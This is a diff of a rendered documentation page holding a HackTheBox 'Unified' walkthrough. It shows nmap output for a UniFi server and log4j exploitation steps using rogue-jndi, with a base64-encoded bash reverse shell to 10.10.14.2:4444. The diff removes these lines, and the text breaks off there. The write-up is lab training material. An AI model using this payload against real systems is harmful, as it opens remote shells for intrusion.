@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -16995,152 +17018,266 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <h1 id="walkthrough-unified-a-hackthebox-machine">Walkthrough - Unified - A HackTheBox machine</h1>
 <p>Enumerate open services:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-Pn
+</span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PORT     STATE SERVICE         VERSION
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>| ssh-hostkey: 
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>6789/tcp open  ibm-db2-admin?
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>8080/tcp open  http-proxy
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>| http-methods: 
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>|_  Supported Methods: GET HEAD POST OPTIONS
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>| fingerprint-strings: 
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>|   FourOhFourRequest: 
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>|     HTTP/1.1 404 
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>|     Content-Type: text/html;charset=utf-8
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>|     Content-Language: en
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>|     Content-Length: 431
-</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>|     Date: Mon, 08 May 2023 10:46:41 GMT
-</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>|     Connection: close
-</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 
-</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>|     Found&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 
-</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
-</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>|   GetRequest, HTTPOptions: 
-</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>|     HTTP/1.1 302 
-</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>|     Location: http://localhost:8080/manage
-</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>|     Content-Length: 0
-</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>|     Date: Mon, 08 May 2023 10:46:41 GMT
-</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>|     Connection: close
-</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>|   RTSPRequest, Socks5: 
-</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>|     HTTP/1.1 400 
-</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>|     Content-Type: text/html;charset=utf-8
-</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>|     Content-Language: en
-</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>|     Content-Length: 435
-</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>|     Date: Mon, 08 May 2023 10:46:41 GMT
-</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>|     Connection: close
-</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
-</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
-</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
-</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>|_http-open-proxy: Proxy might be redirecting requests
-</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>8443/tcp open  ssl/nagios-nsca Nagios NSCA
-</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>| http-title: UniFi Network
-</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>|_Requested resource was /manage/account/login?redirect=%2Fmanage
-</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
-</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>| Subject Alternative Name: DNS:UniFi
-</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
-</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>| Public Key type: rsa
-</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>| Public Key bits: 2048
-</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>| Signature Algorithm: sha256WithRSAEncryption
-</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>| Not valid before: 2021-12-30T21:37:24
-</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>| Not valid after:  2024-04-03T21:37:24
-</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>| MD5:   e6be8c035e126827d1fe612ddc76a919
-</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>| SHA-1: 111baa119cca44017cec6e03dc455cfe65f6d829
-</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>| -----BEGIN CERTIFICATE-----
-</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-1-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-1-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-1-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-1-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-1-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-1-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-1-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-1-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-1-10">10</a></span>
+<span class="normal"><a href="#__codelineno-1-11">11</a></span>
+<span class="normal"><a href="#__codelineno-1-12">12</a></span>
+<span class="normal"><a href="#__codelineno-1-13">13</a></span>
+<span class="normal"><a href="#__codelineno-1-14">14</a></span>
+<span class="normal"><a href="#__codelineno-1-15">15</a></span>
+<span class="normal"><a href="#__codelineno-1-16">16</a></span>
+<span class="normal"><a href="#__codelineno-1-17">17</a></span>
+<span class="normal"><a href="#__codelineno-1-18">18</a></span>
+<span class="normal"><a href="#__codelineno-1-19">19</a></span>
+<span class="normal"><a href="#__codelineno-1-20">20</a></span>
+<span class="normal"><a href="#__codelineno-1-21">21</a></span>
+<span class="normal"><a href="#__codelineno-1-22">22</a></span>
+<span class="normal"><a href="#__codelineno-1-23">23</a></span>
+<span class="normal"><a href="#__codelineno-1-24">24</a></span>
+<span class="normal"><a href="#__codelineno-1-25">25</a></span>
+<span class="normal"><a href="#__codelineno-1-26">26</a></span>
+<span class="normal"><a href="#__codelineno-1-27">27</a></span>
+<span class="normal"><a href="#__codelineno-1-28">28</a></span>
+<span class="normal"><a href="#__codelineno-1-29">29</a></span>
+<span class="normal"><a href="#__codelineno-1-30">30</a></span>
+<span class="normal"><a href="#__codelineno-1-31">31</a></span>
+<span class="normal"><a href="#__codelineno-1-32">32</a></span>
+<span class="normal"><a href="#__codelineno-1-33">33</a></span>
+<span class="normal"><a href="#__codelineno-1-34">34</a></span>
+<span class="normal"><a href="#__codelineno-1-35">35</a></span>
+<span class="normal"><a href="#__codelineno-1-36">36</a></span>
+<span class="normal"><a href="#__codelineno-1-37">37</a></span>
+<span class="normal"><a href="#__codelineno-1-38">38</a></span>
+<span class="normal"><a href="#__codelineno-1-39">39</a></span>
+<span class="normal"><a href="#__codelineno-1-40">40</a></span>
+<span class="normal"><a href="#__codelineno-1-41">41</a></span>
+<span class="normal"><a href="#__codelineno-1-42">42</a></span>
+<span class="normal"><a href="#__codelineno-1-43">43</a></span>
+<span class="normal"><a href="#__codelineno-1-44">44</a></span>
+<span class="normal"><a href="#__codelineno-1-45">45</a></span>
+<span class="normal"><a href="#__codelineno-1-46">46</a></span>
+<span class="normal"><a href="#__codelineno-1-47">47</a></span>
+<span class="normal"><a href="#__codelineno-1-48">48</a></span>
+<span class="normal"><a href="#__codelineno-1-49">49</a></span>
+<span class="normal"><a href="#__codelineno-1-50">50</a></span>
+<span class="normal"><a href="#__codelineno-1-51">51</a></span>
+<span class="normal"><a href="#__codelineno-1-52">52</a></span>
+<span class="normal"><a href="#__codelineno-1-53">53</a></span>
+<span class="normal"><a href="#__codelineno-1-54">54</a></span>
+<span class="normal"><a href="#__codelineno-1-55">55</a></span>
+<span class="normal"><a href="#__codelineno-1-56">56</a></span>
+<span class="normal"><a href="#__codelineno-1-57">57</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>PORT     STATE SERVICE         VERSION
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>| ssh-hostkey: 
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a>|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a>|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10"></a>6789/tcp open  ibm-db2-admin?
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11"></a>8080/tcp open  http-proxy
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12"></a>| http-methods: 
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13"></a>|_  Supported Methods: GET HEAD POST OPTIONS
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14"></a>|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15"></a>| fingerprint-strings: 
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16"></a>|   FourOhFourRequest: 
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17"></a>|     HTTP/1.1 404 
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18"></a>|     Content-Type: text/html;charset=utf-8
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19"></a>|     Content-Language: en
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20"></a>|     Content-Length: 431
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21"></a>|     Date: Mon, 08 May 2023 10:46:41 GMT
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22"></a>|     Connection: close
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23"></a>|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24"></a>|     Found&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25"></a>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26"></a>|   GetRequest, HTTPOptions: 
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27"></a>|     HTTP/1.1 302 
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28"></a>|     Location: http://localhost:8080/manage
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29"></a>|     Content-Length: 0
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30"></a>|     Date: Mon, 08 May 2023 10:46:41 GMT
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31"></a>|     Connection: close
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32"></a>|   RTSPRequest, Socks5: 
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33"></a>|     HTTP/1.1 400 
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34"></a>|     Content-Type: text/html;charset=utf-8
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35"></a>|     Content-Language: en
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36"></a>|     Content-Length: 435
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37"></a>|     Date: Mon, 08 May 2023 10:46:41 GMT
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38"></a>|     Connection: close
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39"></a>|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40"></a>|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41"></a>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42"></a>|_http-open-proxy: Proxy might be redirecting requests
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43"></a>8443/tcp open  ssl/nagios-nsca Nagios NSCA
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44"></a>| http-title: UniFi Network
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45"></a>|_Requested resource was /manage/account/login?redirect=%2Fmanage
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46"></a>| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47"></a>| Subject Alternative Name: DNS:UniFi
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48"></a>| Issuer: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US/organizationalUnitName=UniFi/localityName=New York
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49"></a>| Public Key type: rsa
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50"></a>| Public Key bits: 2048
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51"></a>| Signature Algorithm: sha256WithRSAEncryption
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52"></a>| Not valid before: 2021-12-30T21:37:24
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53"></a>| Not valid after:  2024-04-03T21:37:24
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54"></a>| MD5:   e6be8c035e126827d1fe612ddc76a919
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55"></a>| SHA-1: 111baa119cca44017cec6e03dc455cfe65f6d829
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56"></a>| -----BEGIN CERTIFICATE-----
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57"></a>| MIIDfTCCAmWgAwIBAgIEYc4mlDANBgkqhkiG9w0BAQsFADBrMQswCQYDVQQGEwJV
+</span></code></pre></div></td></tr></table></div>
 <p>After visiting https://10.129.96.149:8080/, we are redirected to https://10.129.96.149:8443/manage/account/login</p>
 <p>It's a login panel of Unifi application and version is disclosed: 6.4.54. A quick search in google for "exploit unifi 6.4.54" returns that it has a <a href="../log4j/">log4j vulnerability</a>.</p>
 <p>For exploiting it:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>openjdk-11-jre<span class="w"> </span>maven
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/veracode-research/rogue-jndi<span class="w"> </span>
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="nb">cd</span><span class="w"> </span>rogue-jndi
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>mvn<span class="w"> </span>package
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="c1"># Once it&#39;s build, make a reverse shell in base64 with attacker machine and listening port</span>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="c1"># This will return: YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK</span>
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c1"># Get out of rogue-jndi folder and</span>
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>java<span class="w"> </span>-jar<span class="w"> </span>rogue-jndi/target/RogueJndi-1.1.jar<span class="w"> </span>--command<span class="w"> </span><span class="s2">&quot;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}&quot;</span><span class="w"> </span>--hostname<span class="w"> </span><span class="s2">&quot;10.129.96.149&quot;</span>
-</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="c1"># In the bash command, copy paste your reverse shell in base64</span>
